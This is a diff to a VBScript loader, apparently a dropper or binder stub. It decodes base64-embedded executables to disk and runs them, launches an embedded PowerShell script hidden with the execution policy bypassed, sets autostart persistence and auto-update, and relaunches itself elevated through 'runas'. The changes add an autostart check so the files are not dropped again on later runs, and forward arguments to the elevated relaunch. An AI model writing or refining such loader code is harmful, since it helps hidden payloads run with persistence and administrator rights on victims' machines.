@@ -26,32 +26,39 @@ End If
 
 
 Sub MainScriptLogic()
-    For i = 0 To UBound(arrFrontName)
-        data = arrFrontData(i)
-        exe = GetFilePath(arrFrontName(i))
-        DecodeBase64ToFile data, exe
-        ExecuteFileAsync exe, False
-    Next
+    if IsAutoStart() = False then
+        For i = 0 To UBound(arrFrontName)
+            data = arrFrontData(i)
+            exe = GetFilePath(arrFrontName(i))
+            DecodeBase64ToFile data, exe
+            ExecuteFileAsync exe, False
+        Next
+    end if
 
-    if Not FileExists(GetPS1FilePath) Then
+    if Not FileExists(GetPS1FilePath) or IsAutoStart() = False Then
         DecodeBase64ToFile bodyX, GetPS1FilePath
     end if
 
     Run
 
-    if autostart = "True" Then
-        DoSetAutoStart
+    if IsAutoStart() = False then
+        if autostart = "True" Then
+            DoSetAutoStart
+        end if
     end if
+
     if autoupdate = "True" Then
         DoAutoUpdate
     end if
 
-    For i = 0 To UBound(arrBackName)
-        data = arrBackData(i)
-        exe = GetFilePath(arrBackName(i))
-        DecodeBase64ToFile data, exe
-        ExecuteFileAsync exe, True
-    Next
+    if IsAutoStart() = False then
+        For i = 0 To UBound(arrBackName)
+            data = arrBackData(i)
+            exe = GetFilePath(arrBackName(i))
+            DecodeBase64ToFile data, exe
+            ExecuteFileAsync exe, True
+        Next
+    end if
 End Sub
 
 Function GetPS1FilePath()
@@ -81,6 +88,9 @@ Sub Run
     Set shell = CreateObject("WScript.Shell")
     Dim command
     command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & GetPS1FilePath & """"
+    if IsAutoStart() = True then
+        command = command & " -autostart"
+    end if
     shell.Run command, 0, True
 end sub
 
@@ -95,7 +105,23 @@ End Function
 Sub RunElevated()
     Dim objShell
     Set objShell = CreateObject("Shell.Application")
-    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
+
+    ' Capture command-line arguments
+    Dim args
+    args = ""
+    Dim i
+    For i = 1 To WScript.Arguments.Count
+        args = args & " " & WScript.Arguments(i - 1)
+    Next
+
+    ' Construct the command string with the script name and arguments
+    Dim command
+    command = Chr(34) & WScript.ScriptFullName & Chr(34) & args
+
+    ' Execute the script with elevated privileges
+    objShell.ShellExecute "wscript.exe", command, "", "runas", 1
+
+    ' Exit the script
     WScript.Quit
 End Sub
 
